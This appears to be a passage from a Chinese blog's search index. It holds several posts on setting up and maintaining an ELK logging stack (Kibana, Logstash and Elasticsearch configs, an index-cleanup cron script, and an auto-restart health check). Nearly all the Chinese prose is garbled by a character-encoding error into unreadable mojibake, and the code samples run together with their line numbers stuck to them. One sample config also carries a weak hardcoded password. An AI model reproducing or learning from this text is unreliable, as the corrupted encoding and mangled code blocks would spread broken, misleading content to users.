è®ºelasticsearch.tribe.requestHeadersWhitelisté…ç½®å¦‚ä½•ï¼Œå®¢æˆ·ç«¯å¤´éƒ½ä¸èƒ½è¦†ç›–ä»»ä½•è‡ªå®šä¹‰å¤´æ–‡ä»¶ã€‚ æ ¹æ®ä¸åŒçš„éœ€æ±‚é…ç½®ï¼š 1234567[root@logstash config]# cat kibana.yml | grep -Pv \"^#|^$\"server.port: 5601server.host: \"10.11.10.26\"server.name: \"jollychic-log\"elasticsearch.url: \"http://10.11.10.26:9200\"elasticsearch.preserveHost: truekibana.index: \".kibana\" é…ç½®å¥½é…ç½®ï¼Œå¯åŠ¨æœåŠ¡ï¼š./bin/kibana &amp; åå°å¯åŠ¨ 1.2 è®¿é—®Kibana æ£€æŸ¥KibanaçŠ¶æ€ æ‚¨å¯ä»¥é€šè¿‡å¯¼èˆªåˆ°è¾¾KibanaæœåŠ¡å™¨çš„çŠ¶æ€é¡µé¢localhost:5601/statusã€‚çŠ¶æ€é¡µé¢æ˜¾ç¤ºæœ‰å…³æœåŠ¡å™¨èµ„æºä½¿ç”¨æƒ…å†µçš„ä¿¡æ¯ï¼Œå¹¶åˆ—å‡ºå·²å®‰è£…çš„æ’ä»¶ã€‚ http://10.11.10.26:5601/status é…ç½®ç´¢å¼•æ¨¡å¼æŒ‡å®šä¸ä¸€ä¸ªæˆ–å¤šä¸ªå¼¹æ€§æœç´¢ç´¢å¼•çš„åç§°ç›¸åŒ¹é…çš„ç´¢å¼•æ¨¡å¼ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒKibanaçŒœæµ‹æ‚¨æ­£åœ¨ä½¿ç”¨ç”±Logstashæä¾›ç»™Elasticsearchçš„æ•°æ®ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨é»˜è®¤å€¼logstash-ä½œä¸ºç´¢å¼•æ¨¡å¼ã€‚æ˜Ÿå·ï¼ˆï¼‰åŒ¹é…ç´¢å¼•åç§°ä¸­çš„é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚å¦‚æœæ‚¨çš„å¼¹æ€§æœç´¢ç´¢å¼•éµå¾ªå…¶ä»–å‘½åçº¦å®šï¼Œè¯·è¾“å…¥é€‚å½“çš„æ¨¡å¼ã€‚â€œæ¨¡å¼â€ä¹Ÿå¯ä»¥ç®€å•åœ°æ˜¯å•ä¸ªç´¢å¼•çš„åç§°ã€‚é€‰æ‹©åŒ…å«è¦ç”¨äºæ‰§è¡ŒåŸºäºæ—¶é—´çš„æ¯”è¾ƒçš„æ—¶é—´æˆ³çš„ç´¢å¼•å­—æ®µã€‚Kibanaè¯»å–ç´¢å¼•æ˜ å°„ä»¥åˆ—å‡ºåŒ…å«æ—¶é—´æˆ³çš„æ‰€æœ‰å­—æ®µã€‚å¦‚æœæ‚¨çš„ç´¢å¼•æ²¡æœ‰åŸºäºæ—¶é—´çš„æ•°æ®ï¼Œè¯·ç¦ç”¨ç´¢å¼•åŒ…å«åŸºäºæ—¶é—´çš„äº‹ä»¶é€‰é¡¹ã€‚ é€‰æ‹©ç´¢å¼•æŸ¥çœ‹æ—¥å¿— å®˜ç½‘ä¸­åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨Kibana è¯´çš„å¾ˆè¯¦ç»†ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨Kibana ä¸Šé¢æ˜¯æˆ‘logstashå·²ç»æ­å»ºé…ç½®å¥½ç´¢å¼•æ‰èƒ½è·å–åˆ°ã€‚ä¸‹é¢è®²å¦‚ä½•éƒ¨ç½²logstash å››ã€Logstashçš„éƒ¨ç½²ä¸Elasticsearchç±»ä¼¼ï¼Œåœ¨å®˜ç½‘ä¸‹è½½å‹ç¼©åŒ…åï¼Œè§£å‹å³å¯ç”¨ã€‚ åœ¨éé«˜çº§åœºæ™¯ä¸‹ï¼ŒLogstashæœ¬èº«ä¸éœ€è¦è¿›è¡Œå¤ªå¤šçš„é…ç½®ï¼ˆé…ç½®æ–‡ä»¶åœ¨logstashæ ¹ç›®å½•ä¸‹çš„./config/logstash.ymlï¼‰ï¼Œé«˜çº§åœºæ™¯è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚logstashçš„å¯åŠ¨å‘½ä»¤ä¸º:./bin/logstash -f &lt;pipeline_conf_file&gt; --config.reload.automaticï¼Œå…¶ä¸­-fæŒ‡å®šäº†pipelineé…ç½®æ–‡ä»¶çš„ä½ç½®ï¼Œ--config.reload.automaticæŒ‡å®šäº†pipelineé…ç½®æ–‡ä»¶å¯ä»¥è¿›è¡Œçƒ­åŠ è½½ã€‚æœ¬æ¬¡æˆ‘ä»¬ä½¿ç”¨Logstashä½œä¸ºæ—¥å¿—è§£ææ¨¡å—ï¼ˆLogstashå…¶å®ä¹Ÿå¯ä»¥ä½œä¸ºæ—¥å¿—é‡‡é›†å™¨ï¼‰ï¼Œé‡ç‚¹éœ€è¦é…ç½®pipelineçš„ä¸‰å¤§éƒ¨åˆ†ï¼šinputã€filterå’Œoutputã€‚pipelineæ–‡ä»¶éœ€è¦è‡ªå·±åˆ›å»ºã€‚ Installing Logstash1234567891011121314151617java version \"1.8.0_65\"Java(TM) SE Runtime Environment (build 1.8.0_65-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.65-b01, mixed mode)rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearchvim /etc/yum.repos.d/logstash.repo[logstash-5.x]name=Elastic repository for 5.x packagesbaseurl=https://artifacts.elastic.co/packages/5.x/yumgpgcheck=1gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearchenabled=1autorefresh=1type=rpm-mdsudo yum install logstash é¦–å…ˆï¼Œæˆ‘ä»¬é€šè¿‡è¿è¡Œæœ€åŸºæœ¬çš„Logstashç®¡é“æ¥æµ‹è¯•æ‚¨çš„Logstashå®‰è£…ã€‚ Logstashç®¡é“æœ‰ä¸¤ä¸ªå¿…éœ€çš„å…ƒç´ ï¼Œinputå¹¶ä¸”outputï¼Œå’Œä¸€ä¸ªå¯é€‰çš„å…ƒç´ ï¼Œfilterã€‚è¾“å…¥æ’ä»¶æ¶ˆè€—æ¥è‡ªæºçš„æ•°æ®ï¼Œè¿‡æ»¤å™¨æ’ä»¶ä¼šæŒ‰ç…§æ‚¨æŒ‡å®šçš„æ–¹å¼ä¿®æ”¹æ•°æ®ï¼Œå¹¶ä¸”è¾“å‡ºæ’ä»¶å°†æ•°æ®å†™å…¥åˆ°ç›®çš„åœ°ã€‚ è¦æµ‹è¯•æ‚¨çš„Logstashå®‰è£…ï¼Œè¿è¡Œæœ€åŸºæœ¬çš„Logstashç®¡é“ã€‚ä¾‹å¦‚ï¼š 12cd logstash-5.5.2bin / logstash -e'input &#123;stdin &#123;&#125;&#125; output &#123;stdout &#123;&#125;&#125;' è¯¥-eæ ‡å¿—ä½¿æ‚¨èƒ½å¤Ÿç›´æ¥ä»å‘½ä»¤è¡ŒæŒ‡å®šé…ç½®ã€‚åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šé…ç½®å¯ä»¥å¿«é€Ÿæµ‹è¯•é…ç½®ï¼Œè€Œæ— éœ€åœ¨è¿­ä»£ä¹‹é—´ç¼–è¾‘æ–‡ä»¶ã€‚ç¤ºä¾‹ä¸­çš„æµæ°´çº¿ä»æ ‡å‡†è¾“å…¥ç«¯è¾“å…¥ï¼Œstdinå¹¶stdoutä»¥ç»“æ„åŒ–æ ¼å¼å°†è¯¥è¾“å…¥ç§»åŠ¨åˆ°æ ‡å‡†è¾“å‡º ã€‚ å¯åŠ¨Logstashåï¼Œç­‰åˆ°çœ‹åˆ°â€œPipeline main startedâ€ï¼Œç„¶åhello worldåœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹è¾“å…¥ï¼š 12hello world2017-07-21T01:22:14.405+0000 0.0.0.0 hello world Logstashå°†æ—¶é—´æˆ³å’ŒIPåœ°å€ä¿¡æ¯æ·»åŠ åˆ°æ¶ˆæ¯ä¸­ã€‚é€šè¿‡åœ¨è¿è¡ŒLogstashçš„shellä¸­å‘å‡ºCTRL-Då‘½ä»¤é€€å‡ºLogstash ã€‚ logstashçš„é…ç½®ç‰‡æ®µï¼š 1234567891011121314151617181920#character at the beginning of a line indicates a comment. Use# comments to describe your configuration.input &#123; udp &#123; port =&gt; 25826 buffer_size =&gt; 1452 workers =&gt; 3 # Default is 2 queue_size =&gt; 30000 # Default is 2000 &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; [ \"10.11.10.26:9200\" ] user =&gt; logstash password =&gt; logstash &#125;&#125; â˜ºå¾…æ•´ç†ç»­å†™~~ *æ›´æ–°è‡ªåŠ¨åŒ–æ­å»ºesé›†ç¾¤ï¼Œæ¶æ„æ¢³ç†è¯¦è§£-ä¸å®ç°esç›‘æ§æœåŠ¡ Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/05/11/æ—¥å¿—åˆ†æ\u0010å¹³å°/Elasticsearch/ElasticStack 5.xé›†ç¾¤+Kibana-5.5.x+Logstash5.5+kafka2.10ç‰ˆæœ¬éƒ¨ç½²æ¦‚è¿°/"},{"title":"Elasticsearch5.xç‰ˆæœ¬çš„ç´¢å¼•å®šæ—¶è‡ªåŠ¨æ¸…ç†å’Œæ£€æµ‹è¿›ç¨‹çŠ¶æ€è‡ªåŠ¨å¯åŠ¨","text":"elasticsearchçš„ç´¢å¼•å®šæ—¶è‡ªåŠ¨æ¸…ç†ä¹‹å‰ç”¨ logstashæ¥åšæ—¥å¿—æ”¶é›† å¹¶ç”¨ elasticsearchæ¥æœç´¢ï¼Œå› ä¸ºæ—¥å¿—æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæ²¡å‡ å¤©å°±å‘ç°elasticsearchçš„ç´¢å¼•æ–‡ä»¶å¤§çš„å“äººï¼Œä¹‹å‰è¿˜çœŸæ²¡æ¸…ç†è¿‡ã€‚å…¶å®è¦è¯´æ¸…ç†ä¹Ÿç®€å•ï¼Œç›´æ¥åˆ° elasticsearch dataæ–‡ä»¶å¤¹é‡Œåˆ æ‰å°±è¡Œäº†ï¼Œå†™ä¸ªè„šæœ¬å®šæœŸæ¸…ç†é›†ç¾¤esçš„æ—¥å¿—æ•°æ®ã€‚ è¿™é‡Œæˆ‘æ¸…ç†1æœˆ7å·çš„ã€‚ è¿™é‡Œåé¢æ˜¯ç´¢å¼•åç§°ã€‚app_error-2017.01.07 12[root@es_01 sh]# curl -XDELETE 'http://10.47.88.206:9200/app_error-2017.01.07'&#123;\"acknowledged\":true&#125;[root@es_01 sh]# shell 7å¤©æ¸…ç†ä¸€æ¬¡æ•°æ®å†™åœ¨è®¡åˆ’ä»»åŠ¡é‡Œé¢ï¼š 12345678#!/bin/bashnow=`date +%Y%m%d`echo $nowdays_07_before=`date -d \"$now 7 days ago\" +%Y.%m.%d`echo $days_07_beforecurl -XDELETE \"http://$(hostname):9200/log-spm-product-$days_07_before\" &gt; /dev/null 2&gt;&amp;1curl -XDELETE \"http://$(hostname):9200/log-dataexport-product-$days_07_before\" &gt; /dev/null 2&gt;&amp;1 è®¡åˆ’ä»»åŠ¡ï¼š 110 0 * * * /opt/sh/logstash-null.sh å®˜ç½‘ï¼šæ£€æŸ¥çŠ¶æ€æ˜¯å¦å­˜åœ¨ 12345678910111213141516æ£€æŸ¥æ–‡æ¡£æ˜¯å¦å­˜åœ¨ç¼–è¾‘å¦‚æœåªæƒ³æ£€æŸ¥ä¸€ä¸ªæ–‡æ¡£æ˜¯å¦å­˜åœ¨ --æ ¹æœ¬ä¸æƒ³å…³å¿ƒå†…å®¹--é‚£ä¹ˆç”¨ HEAD æ–¹æ³•æ¥ä»£æ›¿ GET æ–¹æ³•ã€‚ HEAD è¯·æ±‚æ²¡æœ‰è¿”å›ä½“ï¼Œåªè¿”å›ä¸€ä¸ª HTTP è¯·æ±‚æŠ¥å¤´ï¼šcurl -i -XHEAD http://localhost:9200/website/blog/123å¦‚æœæ–‡æ¡£å­˜åœ¨ï¼Œ Elasticsearch å°†è¿”å›ä¸€ä¸ª 200 ok çš„çŠ¶æ€ç ï¼šHTTP/1.1 200 OKContent-Type: text/plain; charset=UTF-8Content-Length: 0è‹¥æ–‡æ¡£ä¸å­˜åœ¨ï¼Œ Elasticsearch å°†è¿”å›ä¸€ä¸ª 404 Not Found çš„çŠ¶æ€ç ï¼šcurl -i -XHEAD http://localhost:9200/website/blog/124HTTP/1.1 404 Not FoundContent-Type: text/plain; charset=UTF-8Content-Length: 0å½“ç„¶ï¼Œä¸€ä¸ªæ–‡æ¡£ä»…ä»…æ˜¯åœ¨æ£€æŸ¥çš„æ—¶å€™ä¸å­˜åœ¨ï¼Œå¹¶ä¸æ„å‘³ç€ä¸€æ¯«ç§’ä¹‹åå®ƒä¹Ÿä¸å­˜åœ¨ï¼šä¹Ÿè®¸åŒæ—¶æ­£å¥½å¦ä¸€ä¸ªè¿›ç¨‹å°±åˆ›å»ºäº†è¯¥æ–‡æ¡£ã€‚ è‡ªåŠ¨æ£€æµ‹esç«¯å£çŠ¶æ€å¦‚ä½•ä¸å­˜åœ¨å¯åŠ¨12345vim /bin/whole51/es_poss.sh#!/bin/bashsource /etc/profilecurl -Is \"10.11.10.26:9200\" | grep -q 'HTTP/1.1 200 OK' || su - elasticsearch -c \"/usr/local/elasticsearch-5.5.2/bin/elasticsearch -d\"curl -Is \"10.11.10.26:5601\" | grep -q 'HTTP/1.1 200 OK' || /usr/local/kibana-5.5.2/bin/kibana &amp; 1*/2 * * * * /bin/whole51/es.sh Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2016/01/30/æ—¥å¿—åˆ†æ\u0010å¹³å°/Elasticsearch/Elasticsearch5.xç‰ˆæœ¬çš„ç´¢å¼•å®šæ—¶è‡ªåŠ¨æ¸…ç†å’Œæ£€æµ‹è¿›ç¨‹çŠ¶æ€è‡ªåŠ¨å¯åŠ¨/"},{"title":"Logstashåˆ†äº«,onlineç”Ÿäº§ç¯å¢ƒçš„ä½¿ç”¨,onlineæ—¥å¿—è§„èŒƒã€‚","text":"Logstashåˆ†äº«,onlineç”Ÿäº§ç¯å¢ƒçš„ä½¿ç”¨,onlineæ—¥å¿—è§„èŒƒã€‚å†™è¿™ç¯‡æ–‡ç« ï¼Œä¸»è¦åˆ†äº«å‡ ç‚¹: å› ä¸ºå­¦æ‰€æœ‰å­¦ï¼Œæ—¢ç„¶å­¦ä½•ä¸æ·±åº¦å»äº†è§£~ ä»€ä¹ˆæ˜¯Logstashï¼Ÿ logstashè¿è¡Œåœ¨ä»€ä¹ˆç¯å¢ƒä¸‹å¯¹åº”çš„ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ logstashå·¥ä½œåŸç†ï¼Ÿ onlineæ—¥å¿—ç°åœ¨æ˜¯å¦‚ä½•è§„èŒƒï¼Ÿ å¦‚ä½•å†™logstashæ”¶é›†confæ–‡ä»¶ï¼Ÿ 1. ä»€ä¹ˆæ˜¯Logstashï¼Ÿ1Logstash æ˜¯æœ‰ç®¡é“è¾“é€èƒ½åŠ›çš„å¼€æºæ•°æ®æ”¶é›†å¼•æ“ã€‚å®ƒå¯ä»¥åŠ¨æ€åœ°ä»åˆ†æ•£çš„æ•°æ®æºæ”¶é›†æ•°æ®ï¼Œå¹¶ä¸”æ ‡å‡†åŒ–æ•°æ®è¾“é€åˆ°ä½ é€‰æ‹©çš„ç›®çš„åœ°ã€‚å®ƒæ˜¯ä¸€æ¬¾æ—¥å¿—è€Œä¸ä»…é™äºæ—¥å¿—çš„æœé›†å¤„ç†æ¡†æ¶ï¼Œå°†åˆ†æ•£å¤šæ ·çš„æ•°æ®æœé›†è‡ªå®šä¹‰å¤„ç†å¹¶è¾“å‡ºåˆ°æŒ‡å®šä½ç½®ã€‚ 2. logstashè¿è¡Œåœ¨ä»€ä¹ˆç¯å¢ƒä¸‹å¯¹åº”çš„ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ123456logstashæ›´æ–°æ¯”è¾ƒå¿«ï¼Œè·Ÿesä¸€æ ·ï¼Œ2.4ä»¥ä¸Šç›´æ¥å‡çº§åˆ°5.0 5.0xä»¥ä¸‹ç‰ˆæœ¬è¿è¡Œç¯å¢ƒ éœ€è¦JDK1.7ä»¥ä¸Šç‰ˆæœ¬.5.0xç‰ˆæœ¬è¿è¡Œç¯å¢ƒ éœ€è¦JDK1.8ä»¥ä¸Šç‰ˆæœ¬ã€‚å®‰è£…æ–¹æ³•å¾ˆå¤šï¼šyum,rpm,tar.gzæºç ï¼Œ æ”¯æŒDockeré•œåƒè¿è¡Œã€‚ 3. logstashå·¥ä½œåŸç†ï¼Ÿ12345678Logstashä½¿ç”¨ç®¡é“æ–¹å¼è¿›è¡Œæ—¥å¿—çš„æœé›†å¤„ç†å’Œè¾“å‡ºã€‚æœ‰ç‚¹ç±»ä¼¼linuxç³»ç»Ÿçš„ç®¡é“å‘½ä»¤ xxx | ccc | dddï¼Œxxxæ‰§è¡Œå®Œäº†ä¼šæ‰§è¡Œcccï¼Œç„¶åæ‰§è¡Œdddã€‚logstashæ”¶é›†æ—¥å¿—åŸºæœ¬æµç¨‹: input--&gt;codec--&gt;filter--&gt;codec--&gt;output 1.input:ä»å“ªé‡Œæ”¶é›†æ—¥å¿—ã€‚ 2.filter:å‘å‡ºå»å‰è¿›è¡Œè¿‡æ»¤ ï¼ˆä¸æ˜¯å¿…é¡»çš„ï¼‰3.output:è¾“å‡ºè‡³Elasticsearchæˆ–Redisæ¶ˆæ¯é˜Ÿåˆ— 4.codec:è¾“å‡ºè‡³å‰å°ï¼Œæ–¹ä¾¿è¾¹å®è·µè¾¹æµ‹è¯• 5.æ•°æ®é‡ä¸å¤§æ—¥å¿—æŒ‰ç…§æœˆæ¥è¿›è¡Œæ”¶é›† 4.æ—¥å¿—ç°åœ¨æ”¶é›†è§„èŒƒï¼šæ˜¯è®°å½•ç”¨æˆ·è®¿é—®è¡Œä¸ºå’ŒæœåŠ¡è¿è¡ŒçŠ¶æ€çš„ä¿¡æ¯ï¼Œæ˜¯åº”ç”¨è½¯ä»¶åŸºæœ¬çš„è¾“å‡ºå•å…ƒï¼Œåšåˆ°æ—¥å¿—è¾“å‡ºä½ç½®ã€å‘½åã€æ ¼å¼è§„èŒƒï¼Œå¯ä»¥å¤§å¤§æ–¹ä¾¿åç»­åº”ç”¨æœåŠ¡ç›‘æ§å’Œæ•°æ®åˆ†æã€‚ 12345678910111213141516171819202122232425261. æ—¥å¿—ç›®å½•ç»“æ„2. æ—¥å¿—ç±»å‹3. æ—¥å¿—è¦æ±‚é…ç½®4. æ—¥å¿—çº§åˆ«5. æ—¥å¿—åˆ†å‰²ä¸å‘¨æœŸ6. æ—¥å¿—ä¿ç•™è¦æ±‚ç°åœ¨æˆ‘ä»¬online æ—¥å¿—è§„èŒƒæ¶æ„ï¼š###ä¹‹å‰åº”ç”¨æ—¥å¿—è§„èŒƒï¼šä¸€ä¸ªTomcatæœåŠ¡logsç›®å½•ä¸‹é¢çš„æ—¥å¿—ï¼šå®šæœŸå¯¹catalina.outå‡ ä¸ªGæŒ‰ä¸¤ä¸ªå°æ—¶è¿›è¡Œå‹ç¼©ä¸€æ¬¡ï¼Œä¿ç•™7å¤©ï¼Œæ¯å¤©å¤‡ä»½åˆ°log-serveræœåŠ¡å™¨ã€‚logstashæ”¶é›†catalina.outæ‰€æœ‰æ—¥å¿—ã€‚###ç°åœ¨åº”ç”¨æ—¥å¿—è§„èŒƒ:ä¸€ä¸ªTomcatæœåŠ¡logsç›®å½•ä¸‹é¢çš„æ—¥å¿—ï¼šå®šæœŸå¯¹catalina.outæ¯å¤©1Må¤šæ—¥å¿—è¿›è¡Œå‹ç¼©ä¸€æ¬¡ï¼Œä¿ç•™7å¤©ï¼Œæ¯å¤©å¤‡ä»½åˆ°log-serveræœåŠ¡å™¨ã€‚logstashæ”¶é›†æ¯å°åº”ç”¨è¾“å‡ºåº”ç”¨æ—¥å¿—ï¼šerror.log &amp; info.logå¥½å¤„åˆ†åˆ«ä¸ºå››ä¸ªï¼š 1.å¯¹ç´¢å¼•çš„è¦æ±‚ç»†åˆ†å’ŒkibanaæŸ¥è¯¢æ—¥å¿—é€Ÿåº¦æ— ç–‘ä¼šå˜æ›´å¿«ã€‚2.æŸ¥è¯¢æ—¥å¿—å¿«é€Ÿå®šä½ã€‚3.ä¸ä¼šå¯¹catalina.outæ—¥å¿—è¿›è¡Œå¤§çº§åˆ«æ—¥å¿—å†™å…¥ï¼Œé‚£é‡Œåªå­˜æ”¾ç³»ç»Ÿæ—¥å¿—ï¼Œä¾‹å¦‚ï¼šå‘å¸ƒæ—¥å¿—ï¼Œè¯·æ±‚ç¬¬ä¸‰æ–¹åœ°å€æ—¥å¿—ã€‚4.æ—¥å¿—å¼€å‘å¯ä»¥åœ¨Javaä»£ç log4jæ–‡ä»¶å¤§å°æŒ‡å®šå‹ç¼©ï¼Œæ¯å¤©å®šæ—¶æ¸…ç©ºï¼Œä¸éœ€è¦æˆ‘ä»¬å†™è„šæœ¬å¤„ç†ã€‚å¤šä¸ªè„šæœ¬å®šæ—¶åœ¨è¿è¡Œï¼Œç‰¹åˆ«ä¹±ã€‚ 5.å¦‚ä½•å†™logstashæ”¶é›†confæ–‡ä»¶ï¼Ÿä¸‹é¢æ˜¯æˆ‘å†™å¥½çš„online logstashæ”¶é›†ä»£ç ï¼Œæ ¹æ®ä¹‹å‰æ—¥å¿—æ”¶é›†æ–¹å¼ï¼Œç°åœ¨ä¿®è¿‡å‡ ä¸ªåœ°æ–¹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344 input &#123; stdin&#123;&#125; #å¯ä»¥æ ‡å‡†è¾“å…¥è¯»æ•°æ® ï¼ˆå¯ä»¥æ”¾å¯ä»¥ä¸æ”¾ï¼‰ file &#123; type =&gt; \"tms-task-info\" path =&gt; [\"/data/tms-task_new/logs/info.log\"] start_position =&gt; \"beginning\" #ä»æ–‡ä»¶å¼€å§‹å¤„è¯»å†™ &#125; file &#123; type =&gt; \"tms-task-error\" path =&gt; [\"/data/tms-task_new/logs/error.log\"] start_position =&gt; \"beginning\" #ä»æ–‡ä»¶å¼€å§‹å¤„è¯»å†™ &#125;&#125;filter &#123; #è¿‡æ»¤æ–¹å¼ multiline &#123; pattern =&gt; \"^\\d+-\\d+-\\d+\" negate =&gt; true what =&gt; \"previous\" &#125; &#125;output &#123; if [type] == \"tms-task-info\" &#123; elasticsearch &#123; hosts =&gt; [\"10.155.90.141:9200\",\"10.155.90.176:9200\"] index =&gt; \"log-tms-task-info-%&#123;+YYYY.MM.dd&#125;\" document_type =&gt; \"log\" template_overwrite =&gt; true &#125;&#125; if [type] == \"tms-task-error\" &#123; elasticsearch &#123; hosts =&gt; [\"10.155.90.141:9200\",\"10.155.90.176:9200\"] index =&gt; \"log-tms-task-error-%&#123;+YYYY.MM.dd&#125;\" document_type =&gt; \"log\" template_overwrite =&gt; true &#125; &#125;stdout&#123; codec=&gt;rubydebug #æ§åˆ¶å°è¾“å‡º (ä¸å»ºè®®é…ç½®ï¼Œæµ‹è¯•é˜¶æ®µå¯ä»¥è°ƒè¯•ä½¿ç”¨) &#125;&#125; è§£é‡Š12345678910111213141516171819æœ‰ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„é…ç½®é¡¹ï¼Œå¯ä»¥ç”¨æ¥æŒ‡å®š FileWatch åº“çš„è¡Œä¸ºï¼šdiscover_intervallogstash æ¯éš”å¤šä¹…å»æ£€æŸ¥ä¸€æ¬¡è¢«ç›‘å¬çš„ path ä¸‹æ˜¯å¦æœ‰æ–°æ–‡ä»¶ã€‚é»˜è®¤å€¼æ˜¯ 15 ç§’ã€‚excludeä¸æƒ³è¢«ç›‘å¬çš„æ–‡ä»¶å¯ä»¥æ’é™¤å‡ºå»ï¼Œè¿™é‡Œè·Ÿ path ä¸€æ ·æ”¯æŒ glob å±•å¼€ã€‚sincedb_pathå¦‚æœä½ ä¸æƒ³ç”¨é»˜è®¤çš„ $HOME/.sincedb(Windows å¹³å°ä¸Šåœ¨ C:\\Windows\\System32\\config\\systemprofile\\.sincedb)ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªé…ç½®å®šä¹‰ sincedb æ–‡ä»¶åˆ°å…¶ä»–ä½ç½®ã€‚sincedb_write_intervallogstash æ¯éš”å¤šä¹…å†™ä¸€æ¬¡ sincedb æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯ 15 ç§’ã€‚stat_intervallogstash æ¯éš”å¤šä¹…æ£€æŸ¥ä¸€æ¬¡è¢«ç›‘å¬æ–‡ä»¶çŠ¶æ€ï¼ˆæ˜¯å¦æœ‰æ›´æ–°ï¼‰ï¼Œé»˜è®¤æ˜¯ 1 ç§’ã€‚start_positionlogstash ä»ä»€ä¹ˆä½ç½®å¼€å§‹è¯»å–æ–‡ä»¶æ•°æ®ï¼Œé»˜è®¤æ˜¯ç»“æŸä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´ logstash è¿›ç¨‹ä¼šä»¥ç±»ä¼¼ tail -F çš„å½¢å¼è¿è¡Œã€‚å¦‚æœä½ æ˜¯è¦å¯¼å…¥åŸæœ‰æ•°æ®ï¼ŒæŠŠè¿™ä¸ªè®¾å®šæ”¹æˆ \"beginning\"ï¼Œlogstash è¿›ç¨‹å°±ä»å¤´å¼€å§‹è¯»å–ï¼Œæœ‰ç‚¹ç±»ä¼¼ catï¼Œä½†æ˜¯è¯»åˆ°æœ€åä¸€è¡Œä¸ä¼šç»ˆæ­¢ï¼Œè€Œæ˜¯ç»§ç»­å˜æˆ tail -Fã€‚ é…ç½®è¯¦è§£ï¼šå‚è€ƒä¸­æ–‡æ–‡æ¡£logstash-best-practice-cnå®˜ç½‘è¯¦ç»†è¯´æ˜ï¼šmultiple-input-output-plugins Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/11/13/æ—¥å¿—åˆ†æ\u0010å¹³å°/Elasticsearch/Logstashåˆ†äº«,onlineç”Ÿäº§ç¯å¢ƒçš„ä½¿ç”¨,onlineæ—¥å¿—è§„èŒƒã€‚/"},{"title":"æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6 Kafka ) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°","text":"æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°ä»‹ç»ELKæ˜¯ä¸šç•Œæ ‡å‡†çš„æ—¥å¿—é‡‡é›†,å­˜å‚¨ç´¢å¼•,å±•ç¤ºåˆ†æç³»ç»Ÿè§£å†³æ–¹æ¡ˆ logstashæä¾›äº†çµæ´»å¤šæ ·çš„æ’ä»¶æ”¯æŒä¸åŒçš„input/output ä¸»æµä½¿ç”¨redis/kafkaä½œä¸ºæ—¥å¿—/æ¶ˆæ¯çš„ä¸­é—´ç¯èŠ‚ å¦‚æœå·²æœ‰kafkaçš„ç¯å¢ƒäº†,ä½¿ç”¨kafkaæ¯”ä½¿ç”¨redisæ›´ä½³ ä»¥ä¸‹æ˜¯ä¸€ä¸ªæœ€ç®€åŒ–çš„é…ç½®åšä¸ªç¬”è®°,elasticå®˜ç½‘æä¾›äº†éå¸¸ä¸°å¯Œçš„æ–‡æ¡£ ä¸è¦ç”¨æœç´¢å¼•æ“å»æœç´¢,æ²¡å¤šå°‘ç»“æœçš„,è¯·ç›´æ¥çœ‹å®˜ç½‘æ–‡æ¡£ ç‰ˆæœ¬åŠè¿æ¥elasticseearchç‰ˆæœ¬: 2.4.3 ç³»ç»Ÿè¦æ±‚å¦‚æœä»…ä½œæµ‹è¯•ç”¨, ä¸éœ€è¦ä¸¤å¤©æœºå™¨, å¯ä»¥å°†ä¸¤ä¸ªèŠ‚ç‚¹éƒ¨ç½²åœ¨åŒä¸€å°æœºå™¨ä¸Š, å¯¹ç£ç›˜/cpuè¦æ±‚ä¸é«˜, å†…å­˜å¤§äº2gåŸºæœ¬è¶³å¤Ÿäº† å¦‚æœæ˜¯æ­£å¼ç¯å¢ƒ, éœ€è¦æ ¹æ®æ—¥å¿—é‡è¿›è¡Œè¯„ä¼°, ä¾‹å¦‚, æ¯å¤©æ—¥å¿—é‡å ç¡¬ç›˜çº¦çº¦10G, ä¸”ä¿ç•™30å¤©æ—¥å¿—, åˆ™ç£ç›˜ä¼šå ç”¨çº¦300g, esè®¾å®šçš„é˜ˆå€¼æ˜¯ç£ç›˜ç©ºé—´å æ»¡85%åˆ™æ—¥å¿—å¼€å§‹å‘Šè­¦. 